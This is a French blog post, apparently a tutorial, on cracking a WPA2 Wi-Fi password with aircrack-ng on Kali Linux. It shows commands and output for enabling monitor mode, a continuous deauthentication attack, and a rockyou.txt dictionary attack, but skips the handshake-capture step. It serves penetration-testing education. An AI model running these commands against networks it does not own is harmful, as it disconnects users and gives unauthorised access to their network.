---
title: Aircrack-NG Crack WIFI WPA2 Password
time: 2024-12-19 12:00:00
categories: [Hacking]
tags: [kali,wifi,hack,cybersecurity]
image: /assets/posts/WiFi/aircrack.jpg
---

## 🚨 Préambule Éthique

> **ATTENTION :** Ce guide est strictement à des fins éducatives et professionnelles.


## 🚀 Aircrack-NG 


-------------------

## 🎯 Préréquis
>  Un ordinateur portable

>  Système Kali linux 

>  Adaptateur Wifi qui supporte le mode monitor 

>  Votre propre point d'acès WIFI que vous avez le droit de pirater 

-------------------


## 🛠️ Préparation de l'environnement


#### Le lien pour télécharger la machine virtuelle Kali linux.

> [Kali Virtual Machine](https://www.kali.org/get-kali/#kali-virtual-machines)


## 🎮 WORKFLOW COMPLET

### 1️⃣ Véfication de l'interface wifi 

> Lancer la commande ```iw  dev``` pour lister les interfaces sans fil actives et leurs configurations.

```bash
┌──(korpstation㉿mrhove)-[~]
└─$ iw dev   
phy#0
	Unnamed/non-netdev interface
		wdev 0xa
		addr e8:2a:ea:2c:3c:74
		type P2P-device
	Interface wlan0
		ifindex 5
		wdev 0x4
		addr e8:2a:ea:2c:3c:74
		ssid korpstation
		type managed
		channel 6 (2437 MHz), width: 20 MHz, center1: 2437 MHz
		txpower 22.00 dBm
		multicast TXQ:
			qsz-byt	qsz-pkt	flows	drops	marks	overlmt	hashcoltx-bytes	tx-packets
			0	0	0	0	0	0	0	00
```
Comme vous pouvez le noter sur la sortie de la commande, mon interface wifi est ```wlan0``` et est bien en mode ```managed```

### 2️⃣ Vérifier les processus en cours
Lancer la commande ```sudo airmon-ng check kill``` pour vérifier et arrêter les processus en cours qui interfereront avec airmong-ng. 

```bash
┌──(korpstation㉿mrhove)-[~]
└─$ sudo airmon-ng check kill
Killing these processes:

    PID Name
    779 wpa_supplicant

```

### 3️⃣ Activation du mode monitor
Lancer la commande ```sudo airmon-ng start wlan0 ``` pour mettre notre interface en mode monitor. 
> Le mode monitor permet à notre carte wifi d'écouter tout le traffic wifi environnant pour nous afficher les réseaux disponibles.

> Relancer la commande ```iw dev ``` pour vérifier si l'interface est bien passée au mode monitor 

```bash
┌──(korpstation㉿mrhove)-[~]
└─$ sudo airmon-ng start wlan0 


PHY	Interface	Driver		Chipset

phy0	wlan0		iwlwifi		Intel Corporation Wireless 7260 (rev 6b)
		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)

                                                                                
┌──(korpstation㉿mrhove)-[~]
└─$ iw dev 
phy#0
	Interface wlan0mon
		ifindex 6
		wdev 0xb
		addr e8:2a:ea:2c:3c:74
		type monitor
		channel 10 (2457 MHz), width: 20 MHz (no HT), center1: 2457 MHz

```

### 4️⃣ Capture Stratégique
```bash
# ⚡ Déauthentification Tactique
sudo aireplay-ng --deauth 0 -a [MAC] wlan0mon
```

### 5️⃣ Analyse Finale
```bash
# 🔓 Tentative de Déchiffrement
sudo aircrack-ng -w rockyou.txt capture-01.cap
```

-------------------

